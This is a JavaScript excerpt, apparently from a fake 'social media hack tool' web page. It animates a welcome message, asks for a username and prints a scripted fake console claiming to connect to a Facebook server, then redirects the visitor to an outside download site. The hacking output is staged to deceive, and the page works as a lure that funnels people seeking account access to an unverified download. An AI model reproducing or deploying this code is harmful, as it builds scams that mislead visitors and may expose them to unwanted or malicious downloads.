...
$(function(){
  $(".element").typed({
    strings: ["Welcome to Online Social Media Hack Tool", "Insert Social Media Username"],
    typeSpeed: 10,
    startDelay: 4,
  });
});
...
// console
    ...
    $("#start").click(function(){
           ...
           text:" <span class='text-primary'>Performing server authentication:</span> connect_to_Fb_server(332FS2) <br>"
           ...
           + "<span class='text-feild'>FB Username:</span> "+divValue+" <br>"
           ...
           + "<span class='text-primary'>Initiating redirect procedure.</span> <br>"
            ...
            "fps"        : 60,   
            callback: function () { 
              window.location.href = "https://magadownloads.com/1376040";
            }
      });
